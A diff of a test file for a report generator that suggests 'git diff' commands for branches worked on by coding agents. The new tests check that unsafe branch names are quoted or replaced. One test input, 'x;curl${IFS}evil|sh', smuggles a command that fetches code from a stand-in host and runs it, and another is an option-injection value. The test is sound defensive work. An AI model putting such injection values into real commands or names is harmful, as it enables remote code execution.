@@ -177,7 +177,10 @@ describe('the report', () => {
     expect(text).toContain('交给了 2 份各做一遍')
     expect(text).toContain('— Claude Code · 做完了 · 分支 jacob/x-2 · +38 −12 · 3 个文件 · 测试 ✓')
     expect(text).toContain('— Gemini CLI · 任务没发出去 · 分支 jacob/x-3\n  没能创建 worktree')
-    expect(text).toContain('git diff jacob/x...<分支>')
+    expect(text).toContain('git diff refs/heads/jacob/x...<分支>')
+    // L6: a base from the repository goes into the command as one shell word, or is described.
+    expect(attemptReportText({ base: 'x;curl${IFS}evil|sh', members: [] })).toContain("git diff 'refs/heads/x;curl${IFS}evil|sh'...<分支>")
+    expect(attemptReportText({ base: '--output=/tmp/x', members: [] })).toContain('git diff <基线分支>...<分支>')
     expect(attemptReportText({ base: 'b', members: [{ label: 'Codex', branch: 'b-2', event: 'done', message: '改好了。' }] })).toContain('\n  改好了。\n')
     // Past the shared budget, a long result points to the member's terminal instead.
     const long = attemptReportText({ base: 'b', members: [1, 2, 3, 4].map((n) => ({ label: `A${n}`, branch: `b-${n}`, event: 'done' as const, message: 'x'.repeat(5_000) })) })
